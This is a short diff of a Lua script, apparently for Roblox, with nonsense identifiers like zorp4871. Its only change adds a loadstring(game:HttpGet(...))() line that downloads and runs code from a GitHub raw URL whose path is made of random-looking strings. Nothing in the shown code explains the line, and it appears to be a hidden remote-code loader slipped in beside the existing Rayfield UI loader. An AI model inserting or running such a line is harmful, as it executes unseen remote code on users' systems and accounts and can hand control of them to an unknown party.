@@ -40,7 +40,7 @@ local function zorp4871(message)
         textChannel:SendAsync(message)
     end
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/192831782397878e7eab/192881908914CM29282D2S/refs/heads/main/1928312839HM1198198HMM1442"))()
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/zynlope/rayfield/refs/heads/main/hmmm'))() 
 local title = bluh3721 .. ", " .. bleh9274 .. " - " .. duh1583
 
